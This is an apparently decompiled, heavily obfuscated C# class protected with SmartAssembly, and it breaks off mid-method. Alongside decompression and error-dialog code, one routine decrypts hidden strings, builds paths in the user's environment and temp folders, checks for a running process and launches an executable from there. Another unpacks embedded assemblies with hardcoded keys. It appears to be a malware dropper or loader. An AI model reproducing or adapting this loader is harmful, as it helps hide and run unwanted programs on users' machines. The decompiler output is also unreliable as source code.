using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Web.Services.Protocols;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using ns0;
using ns1;
using ns10;
using ns11;
using ns12;
using ns13;
using ns3;
using ns5;
using ns8;
using ns9;

internal class Class58
{
	static void smethod_0(Class31.Class34 class34_0, int int_0, int int_1)
	{
		if ((class34_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class34_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class34_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class34_0.byte_0, num, class34_0.byte_0, class34_0.int_0, int_0);
				class34_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class34_0.byte_0[class34_0.int_0++] = class34_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class58.smethod_43(class34_0, num, int_0, int_1);
		}
	}

	static void smethod_1(Class31.Class40 class40_0)
	{
		if (class40_0.int_4 >= 65274)
		{
			Class58.smethod_165(class40_0);
		}
		while (class40_0.int_5 < 262 && class40_0.int_7 < class40_0.int_8)
		{
			int num = 65536 - class40_0.int_5 - class40_0.int_4;
			if (num > class40_0.int_8 - class40_0.int_7)
			{
				num = class40_0.int_8 - class40_0.int_7;
			}
			Array.Copy(class40_0.byte_1, class40_0.int_7, class40_0.byte_0, class40_0.int_4 + class40_0.int_5, num);
			class40_0.int_7 += num;
			class40_0.int_6 += num;
			class40_0.int_5 += num;
		}
		if (class40_0.int_5 >= 3)
		{
			Class58.smethod_107(class40_0);
		}
	}

	static void smethod_2(Class31.Class41 class41_0)
	{
		if (class41_0.int_2 <= 0)
		{
			goto IL_0080;
		}
		while (true)
		{
			class41_0.byte_0[class41_0.int_1++] = (byte)class41_0.uint_0;
			if (!v2IJBhvCyRSyXwG8iyi())
			{
				break;
			}
			switch (3)
			{
			case 0:
				break;
			case 1:
			case 3:
				if (class41_0.int_2 > 8)
				{
					class41_0.byte_0[class41_0.int_1++] = (byte)(class41_0.uint_0 >> 8);
				}
				goto IL_0080;
			default:
				goto IL_0080;
			case 5:
				goto end_IL_0009;
			}
			continue;
			end_IL_0009:
			break;
		}
		goto IL_0087;
		IL_0087:
		class41_0.int_2 = 0;
		return;
		IL_0080:
		class41_0.uint_0 = 0u;
		goto IL_0087;
	}

	static void smethod_3(Control0 control0_0, string string_0)
	{
		while (true)
		{
			control0_0.string_0 = string_0;
			while (true)
			{
				control0_0.timer_0.set_Enabled(false);
				control0_0.image_0 = (Image)(object)Class58.smethod_55((string_0.Length <= 0) ? "ok" : "error");
				while (true)
				{
					control0_0.bool_1 = true;
					control0_0.bool_0 = true;
					if (string_0.Length > 0)
					{
						((Control)control0_0).set_Height(100);
					}
					while (true)
					{
						((Control)control0_0).Refresh();
						if (v2IJBhvCyRSyXwG8iyi())
						{
							switch (6)
							{
							case 1:
							case 5:
								break;
							default:
								continue;
							case 2:
							case 4:
								goto end_IL_002d;
							case 0:
								goto end_IL_0006;
							case 6:
								return;
							}
							goto end_IL_006f;
						}
						break;
						continue;
						end_IL_002d:
						break;
					}
					continue;
					end_IL_006f:
					break;
				}
				continue;
				end_IL_0006:
				break;
			}
		}
	}

	static void smethod_4(string string_0, string string_1)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\RedGate\\SmartAssembly", writable: true);
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\RedGate\\SmartAssembly");
			}
			registryKey.SetValue(string_1, string_0);
			registryKey.Close();
		}
		catch
		{
		}
	}

	static void smethod_5()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text6 = default(string);
		string text7 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				object executablePath;
				string text4;
				string text5;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 413:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0033;
						case 5:
							goto IL_004d;
						case 6:
							goto IL_007a;
						case 7:
							goto IL_0083;
						case 8:
							goto IL_008c;
						case 9:
							goto IL_00af;
						case 10:
							goto IL_00bf;
						case 11:
							goto IL_00d4;
						case 12:
							goto IL_00e3;
						case 13:
							goto IL_00f0;
						case 14:
							goto IL_00ff;
						case 15:
							goto IL_011c;
						case 16:
						case 17:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 18:
						case 19:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_011c:
					num = 15;
					Conversion.Int(3405);
					break;
					IL_0008:
					num = 2;
					text = "hhhhhhhhhheeeee";
					goto IL_0011;
					IL_0011:
					num = 3;
					text2 = Interaction.Environ(Class58.smethod_109("5g+BxFHXkdTcEM3cEGgk0A==")) + Class58.smethod_109("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_0033;
					IL_0033:
					num = 4;
					if (Operators.CompareString(text, Class58.smethod_109("SYgwSIDqN1G8QkK/jvXMGw=="), false) != 0)
					{
						goto end_IL_0000_3;
					}
					goto IL_004d;
					IL_004d:
					num = 5;
					text3 = "" + Interaction.Environ(Class58.smethod_109("5g+BxFHXkdTcEM3cEGgk0A==")) + Class58.smethod_109("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + "";
					goto IL_007a;
					IL_007a:
					num = 6;
					executablePath = Application.get_ExecutablePath();
					goto IL_0083;
					IL_0083:
					num = 7;
					text4 = "ows\\CurrentV";
					goto IL_008c;
					IL_008c:
					num = 8;
					text5 = "" + Interaction.Environ(Class58.smethod_109("rRhnphBugUiRcVlpVgLfjw==")) + "\\temp\\";
					goto IL_00af;
					IL_00af:
					num = 9;
					text6 = Class58.smethod_109("Rx4K5yj4QnSzaKx9pdBAPA==");
					goto IL_00bf;
					IL_00bf:
					num = 10;
					text7 = Interaction.Environ(Class58.smethod_109("rRhnphBugUiRcVlpVgLfjw=="));
					goto IL_00d4;
					IL_00d4:
					num = 11;
					Conversion.Int(3405);
					goto IL_00e3;
					IL_00e3:
					num = 12;
					if (Class58.smethod_18(text6))
					{
						break;
					}
					goto IL_00f0;
					IL_00f0:
					num = 13;
					Conversion.Int(3405);
					goto IL_00ff;
					IL_00ff:
					num = 14;
					Process.Start(text7 + "\\" + text6 + ".exe");
					goto IL_011c;
					end_IL_0000_2:
					break;
				}
				num = 17;
				Conversion.Int(3405);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 413;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_6(object[] object_0, Exception exception_0)
	{
		if (exception_0 == null || !(exception_0 is SecurityException) || !(Class54.string_0 == "1") || !Class54.Handler.method_2((SecurityException)exception_0))
		{
			Class58.smethod_19(exception_0, object_0);
			Class54.Handler.method_3(exception_0, bool_1: false, bool_2: false);
		}
	}

	static void smethod_7(Class31.Class33 class33_0)
	{
		int num = 0;
		class33_0.int_2 = 0;
		int num2 = 0;
		class33_0.int_1 = 0;
		int num3 = 0;
		class33_0.int_0 = 0;
		class33_0.uint_0 = 0u;
	}

	static void smethod_8(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8)
	{
		Class58.smethod_19(exception_0, new object[9] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8 });
	}

	static void smethod_9(Class31.Class38.Class39 class39_0, Class31.Class38.Class39 class39_1)
	{
		int num = -1;
		int num2 = 0;
		while (num2 < class39_1.int_1)
		{
			int num3 = 1;
			int num4 = class39_1.byte_0[num2];
			int num5;
			int num6;
			if (num4 == 0)
			{
				num5 = 138;
				num6 = 3;
			}
			else
			{
				num5 = 6;
				num6 = 3;
				if (num != num4)
				{
					class39_0.short_0[num4]++;
					num3 = 0;
				}
			}
			num = num4;
			num2++;
			while (num2 < class39_1.int_1 && num == class39_1.byte_0[num2])
			{
				num2++;
				if (++num3 >= num5)
				{
					break;
				}
			}
			if (num3 < num6)
			{
				class39_0.short_0[num] += (short)num3;
			}
			else if (num != 0)
			{
				class39_0.short_0[16]++;
			}
			else if (num3 <= 10)
			{
				class39_0.short_0[17]++;
			}
			else
			{
				class39_0.short_0[18]++;
			}
		}
	}

	static int smethod_10(Class31.Class33 class33_0, int int_0)
	{
		int result;
		if (class33_0.int_2 < int_0)
		{
			while (true)
			{
				if (class33_0.int_0 == class33_0.int_1)
				{
					result = -1;
					if (!IwxRFxvB9dB3g1fRikX())
					{
						switch (1)
						{
						case 0:
						case 4:
							break;
						default:
							goto IL_00a6;
						case 5:
							goto end_IL_003b;
						case 1:
							goto IL_00ca;
						}
						continue;
					}
				}
				else
				{
					class33_0.uint_0 |= (uint)(((class33_0.byte_0[class33_0.int_0++] & 0xFF) | ((class33_0.byte_0[class33_0.int_0++] & 0xFF) << 8)) << class33_0.int_2);
				}
				goto IL_00a6;
				IL_00a6:
				class33_0.int_2 += 16;
				break;
				continue;
				end_IL_003b:
				break;
			}
		}
		result = (int)(class33_0.uint_0 & ((1 << int_0) - 1));
		goto IL_00ca;
		IL_00ca:
		return result;
	}

	static byte[] smethod_11(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class58.smethod_139(executingAssembly, callingAssembly))
		{
			return null;
		}
		Class31.Stream0 stream = new Class31.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class58.smethod_57(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class58.smethod_49(stream);
			int num3 = Class58.smethod_49(stream);
			int num4 = Class58.smethod_49(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class58.smethod_57(stream);
			Class58.smethod_57(stream);
			Class58.smethod_57(stream);
			int num5 = Class58.smethod_57(stream);
			int num6 = Class58.smethod_49(stream);
			int num7 = Class58.smethod_49(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class31.Class32 class32_ = new Class31.Class32(array2);
			array = new byte[num5];
			Class58.smethod_25(array.Length, array, 0, class32_);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (num8 == 1)
			{
				int num9 = Class58.smethod_57(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class58.smethod_57(stream);
					num11 = Class58.smethod_57(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class31.Class32 class32_2 = new Class31.Class32(array3);
					Class58.smethod_25(num11, array, i, class32_2);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_ = new byte[8] { 40, 108, 90, 79, 75, 167, 153, 114 };
				byte[] byte_2 = new byte[8] { 12, 203, 192, 71, 32, 217, 115, 121 };
				using ICryptoTransform cryptoTransform = Class58.smethod_60(byte_2, byte_, bool_0: true);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class58.smethod_11(byte_3);
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class58.smethod_13(bool_0: true, byte_4, byte_5);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class58.smethod_11(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static bool smethod_12(EventArgs1 eventArgs1_0, string string_0)
	{
		if (File.Exists(string_0))
		{
			File.Delete(string_0);
		}
		return Class58.smethod_152(eventArgs1_0.class45_0, string_0);
	}

	static ICryptoTransform smethod_13(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_0, byte_1) : symmetricAlgorithm.CreateEncryptor(byte_0, byte_1);
	}

	static int smethod_14(Class31.Class38 class38_0, int int_0)
	{
		if (int_0 == 255)
		{
			return 285;
		}
		int num = 257;
		while (int_0 >= 8)
		{
			num += 4;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	static void smethod_15(EventArgs0 eventArgs0_0, Class45 class45_0)
	{
		if (v2IJBhvCyRSyXwG8iyi())
		{
			switch (4)
			{
			case 0:
			case 4:
				break;
			case 1:
			case 3:
				goto IL_0035;
			default:
				goto IL_0038;
			case 5:
				return;
			}
		}
		Delegate19 delegate19_ = class45_0.delegate19_0;
		goto IL_0035;
		IL_0038:
		delegate19_(class45_0, eventArgs0_0);
		return;
		IL_0035:
		if (delegate19_ == null)
		{
			return;
		}
		goto IL_0038;
	}

	static void smethod_16(Exception exception_0, object object_0, object object_1)
	{
		Class58.smethod_19(exception_0, new object[2] { object_0, object_1 });
	}

	static void smethod_17(Class31.Class38.Class39 class39_0, int int_0)
	{
		Class58.smethod_83(class39_0.class38_0.class41_0, class39_0.short_1[int_0] & 0xFFFF, (int)class39_0.byte_0[int_0]);
	}

	static bool smethod_18(string string_0)
	{
		Process[] processesByName = Process.GetProcessesByName(string_0);
		bool result;
		while (true)
		{
			if (processesByName.Length > 0)
			{
				while (true)
				{
					result = true;
					if (!v2IJBhvCyRSyXwG8iyi())
					{
						break;
					}
					switch (4)
					{
					case 0:
					case 3:
						goto end_IL_0009;
					case 4:
						goto end_IL_0033;
					}
					continue;
					end_IL_0009:
					break;
				}
				continue;
			}
			result = false;
			break;
			continue;
			end_IL_0033:
			break;
		}
		return result;
	}

	static void smethod_19(Exception exception_0, object[] object_0)
	{
		int methodID = -1;
		int ilOffset = -1;
		int num = 0;
		StackTrace stackTrace = new StackTrace(exception_0);
		try
		{
			if (exception_0.StackTrace != null)
			{
				string[] array = exception_0.StackTrace!.Split('\r', '\n');
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text.Length > 0)
					{
						num++;
					}
				}
			}
		}
		catch
		{
			num = -1;
		}
		try
		{
			if (stackTrace.FrameCount > 0)
			{
				StackFrame frame = stackTrace.GetFrame(stackTrace.FrameCount - 1);
				methodID = (frame.GetMethod()!.MetadataToken & 0xFFFFFF) - 1;
				ilOffset = frame.GetILOffset();
			}
		}
		catch
		{
		}
		try
		{
			SmartStackFrame value = new SmartStackFrame(methodID, object_0, ilOffset, num);
			int num2 = 3;
			LinkedList<object> linkedList = default(LinkedList<object>);
			if (!IwxRFxvB9dB3g1fRikX())
			{
				while (true)
				{
					IL_00f8:
					switch (num2)
					{
					case 0:
					case 3:
						while (exception_0.Data.Contains("SmartStackFrames"))
						{
							linkedList = (LinkedList<object>)exception_0.Data["SmartStackFrames"];
							num2 = 5;
							if (IwxRFxvB9dB3g1fRikX())
							{
								continue;
							}
							goto IL_00f8;
						}
						break;
					case 1:
					case 2:
						break;
					default:
						goto IL_011e;
					case 5:
						goto IL_0130;
					}
					break;
				}
			}
			linkedList = new LinkedList<object>();
			goto IL_011e;
			IL_011e:
			exception_0.Data["SmartStackFrames"] = linkedList;
			goto IL_0130;
			IL_0130:
			linkedList.AddLast(value);
		}
		catch
		{
		}
	}

	static void smethod_20(Form1 form1_0)
	{
		//IL_0229: Unknown result type (might be due to invalid IL or missing references)
		//IL_0233: Expected O, but got Unknown
		//IL_0319: Unknown result type (might be due to invalid IL or missing references)
		//IL_0323: Expected O, but got Unknown
		while (true)
		{
			IL_0318:
			form1_0.button_1 = new Button();
			int num = 4;
			if (!v2IJBhvCyRSyXwG8iyi())
			{
				goto IL_0228;
			}
			goto IL_02c1;
			IL_02c1:
			while (true)
			{
				switch (num)
				{
				case 17:
					((Control)form1_0.button_1).set_Size(new Size(100, 24));
					((Control)form1_0.button_1).set_TabIndex(0);
					goto case 1;
				case 1:
				case 5:
					((Control)form1_0.button_1).set_Text("&Quit");
					((Control)form1_0.button_1).add_Click((EventHandler)form1_0.method_1);
					((Control)form1_0.button_0).set_Anchor((AnchorStyles)10);
					goto case 8;
				case 8:
					((ButtonBase)form1_0.button_0).set_FlatStyle((FlatStyle)3);
					goto case 0;
				case 0:
				case 7:
					((Control)form1_0.button_0).set_Location(new Point(202, 188));
					((Control)form1_0.button_0).set_Name("continueButton");
					((Control)form1_0.button_0).set_Size(new Size(100, 24));
					((Control)form1_0.button_0).set_TabIndex(1);
					((Control)form1_0.button_0).set_Text("&Continue");
					goto case 12;
				case 12:
					((Control)form1_0.button_0).add_Click((EventHandler)form1_0.method_0);
					((Control)form1_0.control1_0).set_BackColor(Color.FromArgb(36, 96, 179));
					((Control)form1_0.control1_0).set_Dock((DockStyle)1);
					goto case 14;
				case 14:
					((Control)form1_0.control1_0).set_ForeColor(Color.White);
					form1_0.control1_0.IconState = Enum5.const_2;
					form1_0.control1_0.Image = null;
					((Control)form1_0.control1_0).set_Location(new Point(0, 0));
					((Control)form1_0.control1_0).set_Name("headerControl1");
					((Control)form1_0.control1_0).set_Size(new Size(418, 58));
					((Control)form1_0.control1_0).set_TabIndex(7);
					((Control)form1_0.control1_0).set_TabStop(false);
					((Control)form1_0.control1_0).set_Text("%AppName% attempted to perform an operation not allowed by the security policy.");
					goto case 10;
				case 10:
					((Control)form1_0.class53_0).set_Anchor((AnchorStyles)13);
					((Label)form1_0.class53_0).set_FlatStyle((FlatStyle)3);
					((Control)form1_0.class53_0).set_Location(new Point(20, 72));
					((Control)form1_0.class53_0).set_Name("errorMessage");
					break;
				case 11:
					break;
				case 6:
					goto IL_01ed;
				case 4:
					goto IL_0228;
				case 3:
					((ButtonBase)form1_0.button_1).set_FlatStyle((FlatStyle)3);
					((Control)form1_0.button_1).set_Location(new Point(308, 188));
					((Control)form1_0.button_1).set_Name("quitButton");
					goto case 17;
				case 2:
					((Control)form1_0.class53_0).set_TabIndex(14);
					((Control)form1_0.class53_0).set_Text("errorMessage");
					((Label)form1_0.class53_0).set_UseMnemonic(false);
					num = 9;
					if (v2IJBhvCyRSyXwG8iyi())
					{
						continue;
					}
					goto case 9;
				default:
					num = 14;
					if (!IwxRFxvB9dB3g1fRikX())
					{
						continue;
					}
					goto case 13;
				case 15:
					goto IL_0318;
				case 9:
					((Control)form1_0.control2_0).set_Anchor((AnchorStyles)6);
					((Control)form1_0.control2_0).set_Cursor(Cursors.get_Hand());
					((Control)form1_0.control2_0).set_Location(new Point(6, 186));
					((Control)form1_0.control2_0).set_Name("poweredBy");
					((Control)form1_0.control2_0).set_Size(new Size(120, 32));
					((Control)form1_0.control2_0).set_TabIndex(15);
					((Control)form1_0.control2_0).set_TabStop(false);
					((Control)form1_0.control2_0).set_Text("poweredBy1");
					((Form)form1_0).set_AutoScaleBaseSize(new Size(5, 13));
					((Control)form1_0).set_BackColor(SystemColors.Window);
					goto case 13;
				case 13:
					((Form)form1_0).set_ClientSize(new Size(418, 224));
					goto case 18;
				case 18:
					((Form)form1_0).set_ControlBox(false);
					((Control)form1_0).get_Controls().Add((Control)(object)form1_0.button_0);
					((Control)form1_0).get_Controls().Add((Control)(object)form1_0.button_1);
					((Control)form1_0).get_Controls().Add((Control)(object)form1_0.control1_0);
					((Control)form1_0).get_Controls().Add((Control)(object)form1_0.class53_0);
					((Control)form1_0).get_Controls().Add((Control)(object)form1_0.control2_0);
					((Form)form1_0).set_FormBorderStyle((FormBorderStyle)1);
					goto case 16;
				case 16:
					((Form)form1_0).set_MaximizeBox(false);
					((Form)form1_0).set_MinimizeBox(false);
					((Control)form1_0).set_Name("SecurityExceptionForm");
					((Form)form1_0).set_ShowInTaskbar(false);
					((Form)form1_0).set_StartPosition((FormStartPosition)1);
					((Control)form1_0).set_Text("%AppName%");
					((Control)form1_0).ResumeLayout(false);
					return;
				case 19:
					return;
				}
				break;
			}
			goto IL_01c2;
			IL_0228:
			form1_0.button_0 = new Button();
			form1_0.control1_0 = new Control1();
			goto IL_01ed;
			IL_01ed:
			form1_0.class53_0 = new Class53();
			form1_0.control2_0 = new Control2();
			((Control)form1_0).SuspendLayout();
			((Control)form1_0.button_1).set_Anchor((AnchorStyles)10);
			num = 3;
			if (!v2IJBhvCyRSyXwG8iyi())
			{
				goto IL_01c2;
			}
			goto IL_02c1;
			IL_01c2:
			((Control)form1_0.class53_0).set_Size(new Size(382, 13));
			num = 2;
			if (!v2IJBhvCyRSyXwG8iyi())
			{
				break;
			}
			goto IL_02c1;
		}
	}

	static IntPtr smethod_21(string string_0)
	{
		IEnumerator enumerator = default(IEnumerator);
		IntPtr baseAddress;
		try
		{
			enumerator = Process.GetCurrentProcess().Modules.GetEnumerator();
			while (enumerator.MoveNext())
			{
				ProcessModule processModule = (ProcessModule)enumerator.Current;
				if (!processModule.ModuleName!.ToLower().StartsWith(string_0))
				{
					continue;
				}
				baseAddress = processModule.BaseAddress;
				goto IL_0060;
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		return IntPtr.Zero;
		IL_0060:
		return baseAddress;
	}

	static bool smethod_22(object[] object_0)
	{
		int num = 1;
		do
		{
			if (!Class58.smethod_161(object_0))
			{
				num = checked(num + 1);
				continue;
			}
			return true;
		}
		while (num <= 5);
		return false;
	}

	static void smethod_23(Class44 class44_0, Enum4 enum4_0, string string_0, string string_1)
	{
		class44_0.delegate20_0?.Invoke(class44_0, new EventArgs3(enum4_0, string_0, string_1));
	}

	static void smethod_24(int int_0, byte[] byte_0, Class31.Class34 class34_0, int int_1)
	{
		if (class34_0.int_1 > 0)
		{
			throw new InvalidOperationException();
		}
		if (int_0 > 32768)
		{
			int_1 += int_0 - 32768;
			int_0 = 32768;
		}
		Array.Copy(byte_0, int_1, class34_0.byte_0, 0, int_0);
		class34_0.int_0 = int_0 & 0x7FFF;
	}

	static int smethod_25(int int_0, byte[] byte_0, int int_1, Class31.Class32 class32_0)
	{
		int num = 0;
		do
		{
			if (class32_0.int_4 != 11)
			{
				int num2 = Class58.smethod_58(int_0, int_1, byte_0, class32_0.class34_0);
				int_1 += num2;
				num += num2;
				int_0 -= num2;
				if (int_0 == 0)
				{
					return num;
				}
			}
		}
		while (Class58.smethod_37(class32_0) || (Class58.smethod_98(class32_0.class34_0) > 0 && class32_0.int_4 != 11));
		return num;
	}

	static void smethod_26(Class31.Class38.Class39 class39_0, Class31.Class38.Class39 class39_1)
	{
		int num = -1;
		int num2 = 0;
		int num5 = default(int);
		int num6 = default(int);
		int num7 = default(int);
		while (num2 < class39_0.int_1)
		{
			int num3 = 1;
			int num4 = 4;
			if (!IwxRFxvB9dB3g1fRikX())
			{
			}
			do
			{
				switch (num4)
				{
				default:
					goto IL_0019;
				case 4:
					num5 = class39_0.byte_0[num2];
					if (num5 == 0)
					{
						num6 = 138;
						goto case 7;
					}
					num6 = 6;
					num7 = 3;
					goto case 1;
				case 1:
					if (num != num5)
					{
						Class58.smethod_17(class39_1, num5);
						num3 = 0;
					}
					goto IL_008b;
				case 7:
					num7 = 3;
					goto IL_008b;
				case 9:
					num2++;
					goto IL_0091;
				case 0:
				case 5:
					if (num == class39_0.byte_0[num2])
					{
						num2++;
						if (++num3 < num6)
						{
							goto IL_0091;
						}
					}
					goto IL_00b6;
				case 6:
				case 8:
					Class58.smethod_17(class39_1, 16);
					Class58.smethod_83(class39_0.class38_0.class41_0, num3 - 3, 2);
					break;
				case 2:
					Class58.smethod_83(class39_0.class38_0.class41_0, num3 - 11, 7);
					break;
				case 3:
				case 10:
					break;
					IL_00b6:
					if (num3 < num7)
					{
						while (num3-- > 0)
						{
							Class58.smethod_17(class39_1, num);
						}
						break;
					}
					if (num != 0)
					{
						goto case 6;
					}
					if (num3 <= 10)
					{
						Class58.smethod_17(class39_1, 17);
						Class58.smethod_83(class39_0.class38_0.class41_0, num3 - 3, 3);
						break;
					}
					Class58.smethod_17(class39_1, 18);
					goto case 2;
					IL_008b:
					num = num5;
					goto case 9;
					IL_0091:
					if (num2 < class39_0.int_1)
					{
						goto case 0;
					}
					goto IL_00b6;
				}
				break;
				IL_0019:
				num4 = 9;
			}
			while (v2IJBhvCyRSyXwG8iyi());
		}
	}

	static byte[] smethod_27(byte[] byte_0, int int_0, byte[] byte_1, byte[] byte_2)
	{
		try
		{
			Class31.Stream0 stream = new Class31.Stream0();
			switch (int_0)
			{
			case 0:
			{
				Class31.Class37 class2 = new Class31.Class37();
				DateTime now = DateTime.Now;
				long num3 = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
				uint[] array8 = new uint[256]
				{
					0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
					3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
					450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
					4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
					901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
					3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
					795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
					2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
					1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
					2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
					1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
					2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
					1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
					62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
					3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
					426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
					3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
					906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
					3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
					752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
					2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
					1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
					2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
					1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
					3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
					1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
				};
				uint num4 = uint.MaxValue;
				uint num5 = uint.MaxValue;
				int num6 = 0;
				int num7 = byte_2.Length;
